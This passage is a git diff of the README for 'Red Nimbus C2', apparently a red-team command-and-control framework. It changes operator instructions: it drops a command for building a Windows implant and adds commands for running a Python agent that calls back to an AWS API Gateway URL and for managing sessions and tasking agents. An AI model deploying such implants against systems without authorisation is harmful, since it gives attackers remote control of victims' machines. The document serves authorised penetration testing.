@@ -88,49 +88,44 @@ make destroy
 
 ```bash
 # from RedNimbusC2 directory
-pip3 install -r nimbusc2_client/requirements.txt
+pip3 install -r operator_client/requirements.txt
 
-python3 nimbusc2_client/nimbusc2.py --help
+python3 operator_client/nimbusc2.py --help
 ```
 
 ## Operator Instructions
 
 Red Nimbus C2 uses the following workflow:
 
-1. Generate C2 agent
-2. Deploy agent to target
-3. Issue commands using the Nimbus C2 operator client
-4. Cleanup when finished
+1. Deploy agent to target
+2. Issue commands using the Nimbus C2 operator client
+3. Cleanup when finished
 
-### 1. Generate C2 Agent
+### 1. Deploy Agent to Target System(s)
 
-The Red Nimbus C2 agent is executed on target systems.
+We provide an [example agent written in Python](./agent/agent.py).
 
-On execution, the agent calls back to the Red Nimbus C2 infrastructure and establishes a C2 session.
+You may use this script as a reference to implement your own agent for operational purposes. [Go is a good choice.](https://github.com/bluesentinelsec/OffensiveGoLang)
 
-```bash
-./nimbusc2-create-agent --format exe \
-            --arch amd64 \
-            --platform windows \
-            --c2url https://aws-api-gateway-url \
-            --proxy "http://userName:password123@127.0.0.1:1234" \
-            --private-key "change_me_123!$" \
-            --callback-schedule "cron_schedule" \
-            --kill-date "date" \
-            --implant-group myGroupName \
-            --allow-target myIntendedTarget \
-            --allow-user myTargetUser \
-            --out-file nimbus_agent.exe \
-            --verbose 
-```
-
-### 2. Deploy Agent to Target System(s)
-
-You are responsible for deploying the Nimbus C2 agent to your intended target.
+Otherwise, you are responsible for deploying the agent to your intended target.
 
 As a reminder, always stay in scope, always follow your rules of engagement, and always get explicit written permission to execute prior to conducting your engagement.
 
-### Interact with Agent Sessions
+Once the agent is on target, you can execute it as follows:
+
+```bash
+# view help
+python3 agent.py --help
+
+# start C2 loop
+python3 agent.py --url <AWS API Gateway URL>
+```
+
+### 2. Issue commands using the Nimbus C2 operator client
+
+The Red Nimbus C2 operator client is provided [here](./operator_client/nimbusc2.py).
+
+**Interact with Agent Sessions**
 
 ```bash
 # view summarized info about all sessions
@@ -143,7 +138,7 @@ nimbusc2.py --get-session --session-id <agent_session_id>
 nimbusc2.py --remove-session --session-id <agent_session_id>
 ```
 
-### Issue Commands to Agents
+**Issue Commands to Agents**
 
 ```bash
 # issue an agent task; will be executed by all agents by default
